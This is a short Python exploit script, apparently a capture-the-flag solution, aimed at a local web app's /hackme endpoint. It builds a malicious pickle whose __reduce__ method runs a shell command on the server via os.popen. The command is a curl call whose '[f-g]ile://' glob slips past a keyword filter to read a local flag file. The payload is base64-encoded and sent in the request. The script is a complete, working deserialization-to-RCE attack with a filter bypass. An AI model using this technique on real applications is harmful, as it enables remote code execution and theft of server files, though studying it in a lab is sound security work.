import pickle
import base64
import os
import requests
from shlex import quote

TARGET_URL = 'http://0.0.0.0:5000'
def exec(cmd):
    return os.popen(cmd).read()

class RCE:
    def __init__(self,file = ""):
        self.file = file
        self.output = ''

    def __reduce__(self):
        self.file = quote(self.file)
        if "file" in self.file:
            return
        cmd = ("curl -s "+self.file)
        return exec, (cmd,)

def hackme():
    data = RCE(file="[f-g]ile:///home/achaar/app/flag.txt")
    serialized = pickle.dumps(data)
    data = base64.urlsafe_b64encode(serialized)
    data = data.decode('utf-8')
    res = requests.get(f"{TARGET_URL}/hackme?pickled={data}")
    print(res.text)

hackme()